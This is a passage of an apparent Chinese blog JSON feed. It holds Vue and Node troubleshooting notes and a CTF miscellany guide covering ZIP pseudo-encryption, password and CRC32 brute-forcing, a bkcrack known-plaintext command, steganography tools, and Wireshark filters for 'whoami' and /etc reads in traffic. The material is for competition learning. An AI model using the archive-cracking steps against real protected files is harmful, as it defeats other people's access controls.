class=\"language-apache\">&lt;组件名称&gt;&lt;/组件名称&gt;\n</code></pre>\n<p><strong>注册局部组件:</strong></p>\n<p>页面中私有的组件放在各自的页面文件夹中并使用下面代码局部注册</p>\n<figure class=\"highlight coffeescript\"><figcaption data-lang=\"coffeescript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>import ComponentA from <span class=\"token string\">'./ComponentA'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>import ComponentB from <span class=\"token string\">'./ComponentB'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>export default <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token property\">name</span><span class=\"token operator\">:</span> <span class=\"token string\">\"part\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token property\">components</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span> ComponentA<span class=\"token punctuation\">,</span> ComponentB <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"21vuex中store-is-not-defined\"><a class=\"anchor\" href=\"#21vuex中store-is-not-defined\">#</a> 21.vuex 中 $store is not defined</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNjA2MzQ5L2FydGljbGUvZGV0YWlscy8xMjg3NzgzMDc/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NTAuMSZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTJ+ZGVmYXVsdH5DVFJMSVNUflJhdGUtMS0xMjg3NzgzMDctYmxvZy0xMDMzNjM1ODkuMjM1JTVFdjQwJTVFcGNfcmVsZXZhbnRfM21fc29ydF9kbF9iYXNlMiZhbXA7ZGVwdGhfMS11dG1fc291cmNlPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnQubm9uZS10YXNrLWJsb2ctMn5kZWZhdWx0fkNUUkxJU1R+UmF0ZS0xLTEyODc3ODMwNy1ibG9nLTEwMzM2MzU4OS4yMzUlNUV2NDAlNUVwY19yZWxldmFudF8zbV9zb3J0X2RsX2Jhc2UyJmFtcDt1dG1fcmVsZXZhbnRfaW5kZXg9Mg==\">初次使用 vuex 报错，$store 未定义_js 执行时 store 未创建 - CSDN 博客</span></p>\n<ol>\n<li>\n<p>store 均为小写</p>\n</li>\n<li>\n<p>导包，from‘’部分 vue、vuex 均为开头小写</p>\n</li>\n<li>\n<p>版本问题：vuex 默认 vuex4，vue2 对应 vuex3，vue3 对应 vuex4，，更换版本</p>\n<pre><code>npm  i --save vuex@3\n</code></pre>\n</li>\n</ol>\n<h2 id=\"22unresolved-variable-message\"><a class=\"anchor\" href=\"#22unresolved-variable-message\">#</a> 22.Unresolved variable $message</h2>\n<p>删除项目包下的 node_modules， <code>npm install</code>  重装</p>\n<h2 id=\"23referrer-的值\"><a class=\"anchor\" href=\"#23referrer-的值\">#</a> 23.referrer 的值</h2>\n<ol>\n<li>空字符串默认值： 一般浏览器的默认值是 no-referrer-when-downgrade</li>\n<li>no-referrer： 所有请求不发送 referrer</li>\n<li>no-referrer-when-downgrade： 当请求安全级别下降时不发送 referrer。目前，只有一种情况会发生安全级别下降，即从 HTTPS 到 HTTP。HTTPS 到 HTTP 的资源引用和链接跳转都不会发送 referrer。</li>\n<li>same-origin：对于同源的链接和引用，会发送 referrer，其他的不会。<br />\norigin：会发送 referrer，但只会发送源信息。源信息包括访问协议和域名。</li>\n<li>strict-origin：这个相当于 origin 和 no-referrer-when-downgrade 的 AND 合体。即在安全级别下降时不发送 referrer；安全级别未下降时发送源信息。<br />\n注意：这个是新加的标准，有些浏览器可能还不支持。</li>\n<li>origin-when-cross-origin：这个相当于 origin 和 same-origin 的 OR 合体。同源的链接和引用，会发送完全的 referrer 信息；但非同源链接和引用时，只发送源信息。</li>\n<li>strict-origin-when-cross-origin：这个比较复杂，同源的链接和引用，会发送 referrer。安全级别下降时不发送 referrer。其它情况下发送源信息。注意：这个是新加的标准，有些浏览器可能还不支持。</li>\n<li>unsafe-url：无论是否发生协议降级，无论是本站链接还是站外链接，统统都发送 Referrer 信息。正如其名，这是最宽松而最不安全的策略。</li>\n</ol>\n<p><strong>此方法会破坏浏览器原有的 referer 策略，所有从包含了上面标签的页面中发起的请求将不会携带 referer。慎用！</strong></p>\n<h2 id=\"24idea设置注释模板\"><a class=\"anchor\" href=\"#24idea设置注释模板\">#</a> 24.IDEA 设置注释模板</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121093650625.png\" alt=\"image-20240121093650625\" /></p>\n<pre><code>**\n * description: \n * @since: 1.0.0\n * @author: 作者拼音或者英文名称 \n * @date: $date$ $time$\n $params$\n $returns$\n*/\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121090733819.png\" alt=\"image-20240121090733819\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121090804801.png\" alt=\"image-20240121090804801\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121092200987.png\" alt=\"image-20240121092200987\" /></p>\n<p><strong>params groovyScript 脚本</strong></p>\n<pre><code>groovyScript(&quot;if(\\&quot;$&#123;_1&#125;\\&quot;.length() == 2) &#123;return '';&#125; else &#123;def result=''; def params=\\&quot;$&#123;_1&#125;\\&quot;.replaceAll('[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]', '').split(',').toList();for(i = 0; i &lt; params.size(); i++) &#123;if(i==0)&#123;result+='* @Param ' + params[i] + ': '&#125;else&#123;result+='\\\\n' + ' * @Param ' + params[i] + ': '&#125;&#125;; return result;&#125;&quot;, methodParameters());\n</code></pre>\n<p><strong>return groovyScript 脚本</strong></p>\n<pre><code>groovyScript(&quot;def returnType = \\&quot;$&#123;_1&#125;\\&quot;; def result = '* @return: ' + returnType; return result;&quot;, methodReturnType());\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121091234640.png\" alt=\"image-20240121091234640\" /></p>\n<p>使用方法：/md+Enter</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121093851447.png\" alt=\"image-20240121093851447\" /></p>\n<h2 id=\"25error-error0308010cdigital-envelope-routinesunsupported\"><a class=\"anchor\" href=\"#25error-error0308010cdigital-envelope-routinesunsupported\">#</a> 25.Error: error:0308010C:digital envelope routines::unsupported</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4MzAwNzY3L2FydGljbGUvZGV0YWlscy8xMzE0NTAzMjU=\">终极解决：Error: error:0308010C:digital envelope routines::unsupported-CSDN 博客</span></p>\n<p>出现这个错误是因为 node.js V17 版本中最近发布的 OpenSSL3.0, 而 OpenSSL3.0 对允许算法和密钥大小增加了严格的限制，可能会对生态系统造成一些影响.</p>\n<p>在 node.js V17 以前一些可以正常运行的的应用程序，但是在 V17 版本可能会抛出这个异常。</p>\n<ol>\n<li>\n<p><strong>3.1 版本降级，解决报错</strong></p>\n<p>尝试卸载 Node.js 17 + 版本并重新安装 Node.js 16 + 版本，然后再重新启动</p>\n</li>\n<li>\n<p><strong>设置参数，解决报错</strong></p>\n<p>执行运行项目命令之前，先运行这个命令：</p>\n<p>Linux &amp; Mac OS：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">NODE_OPTIONS</span><span class=\"token operator\">=</span>--openssl-legacy-provider</pre></td></tr></table></figure><p>windows 命令提示符:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">set</span> <span class=\"token assign-left variable\">NODE_OPTIONS</span><span class=\"token operator\">=</span>--openssl-legacy-provider</pre></td></tr></table></figure></li>\n<li>\n<p><strong>修改配置文件，解决报错</strong></p>\n</li>\n</ol>\n<p>找到项目的 <code>package.json</code>  文件，把自己对应的命令，加上 <code>&amp;&amp;</code> ，写到启动项目的配置里面（构建写不写都可以），即可。</p>\n<p>例 1：脚手架</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">\"scripts\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token property\">\"serve\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"export NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service serve\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token property\">\"build\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"export NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service build\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><p>例 2：Vue-Element-Admin</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string-property property\">\"scripts\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string-property property\">\"dev\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"export NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service serve\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 略...</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure>",
            "tags": [
                "开发",
                "As Developers"
            ]
        },
        {
            "id": "http://yoursite.com/CTF/Misc/",
            "url": "http://yoursite.com/CTF/Misc/",
            "title": "CTF-MISC总结",
            "date_published": "2024-03-10T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"入门\"><a class=\"anchor\" href=\"#入门\">#</a> 入门</h1>\n<p><strong>简介</strong></p>\n<p>CTF-wikihttps://ctf-wiki.org/misc/introduction/</p>\n<p>二维码生成<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXJyaS5jeC9xcmF6eWJveC8=\"> QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</span></p>\n<p>L3HCTF cropped<span class=\"exturl\" data-url=\"aHR0cHM6Ly9meWhzc2dzcy5naXRodWIuaW8vMjAyMi8wMS8wOS9MM0hDVEYtU0NURjIwMjEv\">L3HCTF&amp;SCTF2021 部分 wp | FYHSSGSS's blog</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb29sc2hlbGwuY24vYXJ0aWNsZXMvMTA1OTAuaHRtbA==\">二维码的生成细节和原理 | 酷 壳 - CoolShell</span></p>\n<p>条形码、汉信码</p>\n<h1 id=\"压缩包隐写\"><a class=\"anchor\" href=\"#压缩包隐写\">#</a> 压缩包隐写</h1>\n<p>ZIP 格式 https://ctf-wiki.org/misc/archive/zip/</p>\n<p>文件头标识由固定值  <code>50 4B 03 04</code>  开头</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126160106848.png\" alt=\"image-20240126160106848\" /></p>\n<h2 id=\"知识储备\"><a class=\"anchor\" href=\"#知识储备\">#</a> 知识储备</h2>\n<p>[Linux 命令之 unrar -- 解压 rar 格式的文件_unrar 解压命令 - CSDN 博客](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpYW93ZW54aW9uZy9hcnRpY2xlL2RldGFpbHMvMTE3NDU5MjI0Izp+OnRleHQ9dW5yYXI=\">https://blog.csdn.net/liaowenxiong/article/details/117459224#:~:text=unrar</span> 使用帮助 用法 %3A unrar - - e 压缩，t 测试压缩 文件 v [t%2Cb] 详细列出压缩 文件 [技)</p>\n<pre><code># 使用 unrar命令解压，没有可使用下面命令安装\n\tsudo apt-get update\n\tsudo apt-get install unrar\n\n# \nunrar e *.rar\nunzip *.xlsx | zip\n</code></pre>\n<h2 id=\"伪加密\"><a class=\"anchor\" href=\"#伪加密\">#</a> 伪加密</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126155618451.png\" alt=\"image-20240126155618451\" /></p>\n<p><code>Central directory</code>  核心目录中第四个 2 字节的通用为标记设置为<strong> 0</strong> 即表示加密</p>\n<ul>\n<li><strong>010Editor</strong> 以十六进制打开压缩包，0 改为 1</li>\n</ul>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240126155934227.png\" alt=\"image-20240126155934227\" /></p>\n<ul>\n<li><code>binwalk -e</code>  无视伪加密</li>\n<li>在  <code>Mac OS</code>  及部分  <code>Linux</code>  (如  <code>Kali</code>  ) 系统中，可以直接打开伪加密的  <code>ZIP</code>  压缩包</li>\n<li>检测伪加密的小工具  <code>ZipCenOp.jar</code></li>\n<li>有时候用  <code>WinRar</code>  的修复功能（此方法有时有奇效，不仅针对伪加密）</li>\n</ul>\n<h2 id=\"爆破\"><a class=\"anchor\" href=\"#爆破\">#</a> 爆破</h2>\n<ul>\n<li>hashcat 爆破 —— 类似 john 工具</li>\n<li>ARCHPR 密码破解、字典、枚举、掩码</li>\n<li>明文攻击恢复密钥</li>\n<li>python 导入 zipfile 包爆破</li>\n</ul>\n<h2 id=\"crc32\"><a class=\"anchor\" href=\"#crc32\">#</a> CRC32</h2>\n<p><code>32 bit</code>  的冗余校验码， <code>zip</code>  中的  <code>CRC32</code>  是未加密文件的校验值。</p>\n<ul>\n<li>文件内内容很少 (一般比赛中大多为  <code>4 bit</code>  左右)</li>\n<li>加密的密码很长</li>\n</ul>\n<p>不去爆破压缩包的密码，而是直接去爆破源文件的内容，获得与赛题相同的 CRC32 码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>alph <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>crcdict <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"computing all possible CRCs...\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>alph<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    st <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    testcrc <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>st<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    crcdict<span class=\"token punctuation\">[</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;i'</span><span class=\"token punctuation\">,</span> testcrc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> st</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"Done!\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag.zip'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>crc <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> crc <span class=\"token keyword\">in</span> crcdict<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span> crcdict<span class=\"token punctuation\">[</span>crc<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"FAILED!\"</span></pre></td></tr></table></figure><p>可以编写 python 脚本在终端直接用命令行调用</p>\n<h2 id=\"明文攻击\"><a class=\"anchor\" href=\"#明文攻击\">#</a> 明文攻击</h2>\n<p>WinRAR 压缩可以添加注释，选择压缩方式</p>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240126223144879.png&quot; alt=&quot;image-20240126223144879&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>rbkcrack.exe<strong> 已知明文攻击</strong> —— 使用部分原文件修复</p>\n<p><code>.\\rbkcrack.exe -C .\\enc.zip -c enc.pptx -P .\\a.zip-p a.pptx</code></p>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240126233944992.png&quot; alt=&quot;image-20240126233944992&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjA4MTA1NS9hcnRpY2xlL2RldGFpbHMvMTIxODY5MjI3\">第四届 2021 美团网络安全 MT-CTF writeup_mtctf 2021]-CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E4NTE1NzkxODFxL2FydGljbGUvZGV0YWlscy8xMDk3Njc0MjU=\">ZIP 已知明文攻击深入利用_明文攻击密码软件 - CSDN 博客</span></p>\n<h1 id=\"编码相关\"><a class=\"anchor\" href=\"#编码相关\">#</a> 编码相关</h1>\n<p>大多数常用编码 http://www.hiencode.com/</p>\n<p>千千秀字（奇怪编码）<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9kYW9oYW5nLmh0bQ==\">https://www.qqxiuzi.cn/daohang.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3F1aXBxaXVwLmNvbQ==\">http://quipqiup.com</span></p>\n<p>CyberChef 自动解密工具，<strong>Magic 模块</strong>可以解决简单编码工具</p>\n<p>Vigenere crack 工具，简单密钥均可破除<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3ViYWxsYS5kZS92aWdlbmVyZS1zb2x2ZXI=\"> Vigenere Solver | guballa.de</span></p>\n<p>Github 中有词频分析<strong> NLP</strong>、Base、hex 等 Python 脚本</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128111644113.png\" alt=\"image-20240128111644113\" /></p>\n<p>Github：ht0Ruial/TomatoTools 杂项利器</p>\n<h2 id=\"文字编码\"><a class=\"anchor\" href=\"#文字编码\">#</a> 文字编码</h2>\n<p>古典密码：Base 家族，偏移，多表替换加密 -&gt; 维吉尼亚</p>\n<p>可逆编码：压缩、解压缩、url 编码、<strong>特殊</strong>编码、其他编码（</p>\n<p>JSFuck[JSFuck - Write any JavaScript with 6 Characters: <a href=\"\"></a>!+](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qc2Z1Y2suY29tLw==\">https://jsfuck.com/</span>)</p>\n<p>brainfuck</p>\n<p>whitespace<span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLw==\">Whitelips the Esoteric Language IDE (vii5ard.github.io)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Vzb2xhbmdzLm9yZw==\">http://esolangs.org</span></p>\n<p>键盘编码：ijm,lo,ijm,lo wazcde ijm,lo</p>\n<p>九键：746331219363</p>\n<p>莫斯、社会主义编码</p>\n<p>）</p>\n<p>加密算法：</p>\n<ol>\n<li>\n<p>cryptool2<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3J5cHRvb2wub3JnL2VuL2N0Mi9kb3dubG9hZHM=\"> 下载 - CrypTool Portal</span></p>\n</li>\n<li>\n<p>在线解密工具 https://www.sojson.com/encrypt.html</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hMjdiNjU2OWYwMDQ=\">维吉尼亚加解密及唯密文破解 - 简书 (jianshu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGFvZ2UxMjM0NTYuZ2l0aHViLmlvLyVFNyVCQiVCNCVFNSU5MCU4OSVFNSVCMCVCQyVFNCVCQSU5QSVFNSU4QSVBMCVFOCVBNyVBMyVFNSVBRiU4NiVFNSU4RiU4QSVFNSU5NCVBRiVFNSVBRiU4NiVFNiU5NiU4NyVFNyVBMCVCNCVFOCVBNyVBMy5odG1sLyNtb3Jl\">维吉尼亚加解密及唯密文破解 | 小生很忙 (chaoge123456.github.io)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGFvZ2UxMjM0NTYuZ2l0aHViLmlvLw==\">小生很忙 (chaoge123456.github.io)</span></p>\n<h2 id=\"图片编码\"><a class=\"anchor\" href=\"#图片编码\">#</a> 图片编码</h2>\n<p>GIF 分帧题目</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXltbi9wLzQ0Nzk4MDUuaHRtbA==\">Linux 之 convert 命令 - 菜鸡一枚 - 博客园 (cnblogs.com)</span></p>\n<p><strong>linux convert</strong> 命令，支持 JPG, BMP, PCX, GIF, PNG, TIFF, XPM 和 XWD 等类型</p>\n<p><code>convert xxx.jpg xxx.png</code>   将 jpeg 转成 png 文件</p>\n<p><code>convert xxx.gif  xxx.bmp</code>  将 gif 转换成 bmp 图像</p>\n<p><code>convert xxx.tiff  xxx.pcx</code>   将 tiff 转换成 pcx 图像</p>\n<p><code>convert -resize 1024x768 xxx.jpg  xxx1.jpg</code>   将图像的像素改为 1024*768，注意 1024 与 768 之间</p>\n<p><code>convert -sample 50%x50% xxx.jpg xxx1.jpg</code>   将图像的缩减为原来的 50%*50%</p>\n<p><code>convert -rotate 270 sky.jpg sky-final.jpg</code>    将图像顺时针旋转 270 度</p>\n<p><code>convert -fill black -pointsize 60 -font helvetica -draw 'text 10,80 &quot;Hello, World!&quot; ‘ hello.jpg helloworld.jpg</code>    在图像的 10,80 位置采用 60 磅的全黑 Helvetica 字体写上 Hello, World!</p>\n<h1 id=\"图片隐写\"><a class=\"anchor\" href=\"#图片隐写\">#</a> 图片隐写</h1>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128172802733.png\" alt=\"image-20240128172802733\" /></p>\n<h2 id=\"png\"><a class=\"anchor\" href=\"#png\">#</a> PNG</h2>\n<p>宽高、LSB 像素、IDAT (可以隐写文件)、文件结构头尾</p>\n<ol>\n<li>\n<p>pngcheck</p>\n</li>\n<li>\n<p>exiftool</p>\n</li>\n<li>\n<p>zsteg xxx -a</p>\n<pre><code>apt-get update\napt-get upgrade\ngem install zsteg\n</code></pre>\n</li>\n</ol>\n<h2 id=\"jpg\"><a class=\"anchor\" href=\"#jpg\">#</a> JPG</h2>\n<p>哈夫曼实现压缩，更快存储</p>\n<p>JPG 隐写：JPEG，图层隐写 (PS 叠加两张图片)</p>\n<p>Stegdetect</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240129164856400.png\" alt=\"image-20240129164856400\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240129164916205.png\" alt=\"image-20240129164916205\" /></p>\n<h2 id=\"水印\"><a class=\"anchor\" href=\"#水印\">#</a> 水印</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240129171239046.png\" alt=\"image-20240129171239046\" /></p>\n<p><strong>隐写算法</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240129171306678.png\" alt=\"image-20240129171306678\" /></p>\n<h1 id=\"音频隐写\"><a class=\"anchor\" href=\"#音频隐写\">#</a> 音频隐写</h1>\n<p>Audacity 打开 mp3 文件，其中会展现音频波长，根据蓝色的音频宽度判断是否长波还是短波 —— 转换<strong>摩斯电码</strong><br />\n点（・）：表示一个短脉冲信号，持续时间较短。\t# 对应短波<br />\n划（-）：表示一个长脉冲信号，持续时间较长。\t# 对应长波<br />\n间隔：用于分隔各个字母和单词之间的信号。\t\t # 对应空白一条横篮线</p>\n<h1 id=\"电子文档隐写\"><a class=\"anchor\" href=\"#电子文档隐写\">#</a> 电子文档隐写</h1>\n<h1 id=\"智能合约\"><a class=\"anchor\" href=\"#智能合约\">#</a> 智能合约</h1>\n<h1 id=\"流量分析\"><a class=\"anchor\" href=\"#流量分析\">#</a> 流量分析</h1>\n<p><strong>pcap 文件</strong></p>\n<ol>\n<li>wireshark<strong> 统计 --&gt; 协议分级</strong></li>\n<li>上方过滤器查找语法 <code>http contains &quot;password&quot;</code> ，右键追踪流 ----HTTP 流查看详细报文</li>\n</ol>\n<p>文档使用 https://www.cnblogs.com/bulh/articles/13255098.html</p>\n<p><code>http.request.method==&quot;POST&quot;</code></p>\n<p><code>http contains &quot;whoami&quot;</code></p>\n<p>配置文件夹 <code>http.request.method==&quot;POST&quot;&amp;&amp;http contains &quot;etc&quot;</code></p>\n<h1 id=\"取证\"><a class=\"anchor\" href=\"#取证\">#</a> 取证</h1>\n<h1 id=\"特殊类型\"><a class=\"anchor\" href=\"#特殊类型\">#</a> 特殊类型</h1>\n<h2 id=\"pyc文件\"><a class=\"anchor\" href=\"#pyc文件\">#</a> pyc 文件</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvbWlzYy9vdGhlci9weWMvI2NvZGUtb2JqZWN0\">https://ctf-wiki.org/misc/other/pyc/#code-object</span></p>\n<h2 id=\"base64隐写\"><a class=\"anchor\" href=\"#base64隐写\">#</a> base64 隐写</h2>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240127233940153.png&quot; alt=&quot;image-20240127233940153&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<h2 id=\"ntfs数据流隐写\"><a class=\"anchor\" href=\"#ntfs数据流隐写\">#</a> NTFS 数据流隐写</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ2hlc2t5L3AvQUxURVJOQVRFX0RBVEFfU1RSRUFNUy5odG1s\">NTFS 交换数据流隐写的应用 - _chesky - 博客园 (cnblogs.com)</span></p>\n<p>&lt;img 